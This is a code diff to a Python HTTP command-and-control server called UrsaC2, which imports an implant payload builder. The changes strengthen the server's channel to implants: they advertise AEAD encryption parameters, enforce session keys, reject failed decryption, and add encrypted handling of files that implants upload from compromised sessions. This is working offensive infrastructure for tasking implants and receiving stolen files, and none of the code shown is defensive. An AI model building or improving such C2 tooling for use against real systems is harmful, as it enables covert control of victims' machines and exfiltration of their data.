@@ -41,7 +41,15 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from implants.builder import Builder as _PayloadBuilder
 from major.cert import build_ssl_context, ensure_cert
 from major.config import get_config, reload_config
-from major.crypto import UrsaCrypto, generate_session_key
+from major.crypto import (
+    CRYPTO_FRAME_VERSION,
+    CRYPTO_SUITE,
+    FRAME_MAGIC,
+    NONCE_SIZE,
+    TAG_SIZE,
+    UrsaCrypto,
+    generate_session_key,
+)
 from major.db import (
     complete_task,
     create_session,
@@ -423,6 +431,14 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
         self._send_json({
             "session_id": session_id,
             "key": session_key,
+            "crypto": {
+                "suite": CRYPTO_SUITE,
+                "frame_version": CRYPTO_FRAME_VERSION,
+                "frame_magic": FRAME_MAGIC.decode(),
+                "nonce_bytes": NONCE_SIZE,
+                "tag_bytes": TAG_SIZE,
+                "legacy_encrypted_frames": "rejected",
+            },
             "interval": body.get("interval", 5),
             "jitter": body.get("jitter", 0.1),
         })
@@ -461,8 +477,12 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
                 "args": json.loads(task["args"]) if isinstance(task["args"], str) else task["args"],
             })
 
-        # If we have the session key, encrypt the response
-        if session.get("encryption_key") and body.get("encrypted"):
+        # If the client requested encryption, require a session key and return
+        # a versioned AEAD envelope.
+        if body.get("encrypted"):
+            if not session.get("encryption_key"):
+                self._send_json({"error": "session has no encryption key"}, 400)
+                return
             crypto = UrsaCrypto(session["encryption_key"])
             encrypted_tasks = crypto.encrypt_json({"tasks": tasks_out})
             self._send_json({"data": encrypted_tasks})
@@ -496,14 +516,18 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
         result_data = body.get("result", "")
         error_data = body.get("error", "")
 
-        if body.get("encrypted") and session.get("encryption_key"):
+        if body.get("encrypted"):
+            if not session.get("encryption_key"):
+                self._send_json({"error": "session has no encryption key"}, 400)
+                return
             try:
                 crypto = UrsaCrypto(session["encryption_key"])
                 decrypted = crypto.decrypt_json(body["data"])
                 result_data = decrypted.get("result", "")
                 error_data = decrypted.get("error", "")
             except Exception as e:
-                error_data = f"Decryption failed: {e}"
+                self._send_json({"error": f"decryption failed: {e}"}, 400)
+                return
 
         complete_task(task_id, result=result_data, error=error_data)
         update_session_checkin(session_id)
@@ -533,12 +557,26 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
             }
         """
         session_id = body.get("session_id")
-        if not session_id or not get_session(session_id):
+        session = get_session(session_id) if session_id else None
+        if not session:
             self._send_json({"error": "invalid session"}, 400)
             return
 
-        filename = body.get("filename", "unknown")
-        file_data = base64.b64decode(body.get("data", ""))
+        if body.get("encrypted"):
+            if not session.get("encryption_key"):
+                self._send_json({"error": "session has no encryption key"}, 400)
+                return
+            try:
+                crypto = UrsaCrypto(session["encryption_key"])
+                decrypted = crypto.decrypt_json(body["data"])
+                filename = decrypted.get("filename", "unknown")
+                file_data = base64.b64decode(decrypted.get("data", ""))
+            except Exception as e:
+                self._send_json({"error": f"decryption failed: {e}"}, 400)
+                return
+        else:
+            filename = body.get("filename", "unknown")
+            file_data = base64.b64decode(body.get("data", ""))
 
         file_id = store_file(session_id, filename, file_data, direction="download")
         _log(f"    [FILE] Received {filename} ({len(file_data)}B) from session {session_id}")
